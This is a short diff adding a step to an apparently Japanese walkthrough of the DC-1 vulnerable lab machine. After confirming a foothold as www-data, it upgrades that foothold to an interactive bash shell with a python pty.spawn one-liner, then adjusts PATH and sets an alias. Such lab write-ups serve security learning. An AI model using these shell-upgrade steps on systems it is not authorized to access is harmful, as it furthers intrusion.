@@ -85,3 +85,12 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ➢www-dataユーザーであることが分かった
 ```
+13.対話的シェルを奪取する
+```
+which python ←入力							
+/usr/bin/python ←結果							
+python -c 'import pty; pty.spawn("/bin/bash")' ←入力				
+www-data@DC-1:/var/www$ ←結果						
+www-data@DC-1:/var/www$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/usr/games:/tmp ←パスを追加する
+www-data@DC-1:/home$ alias ll='ls -la --color=auto' llコマンドで色をつけてファイルを列挙できるようにする
+```
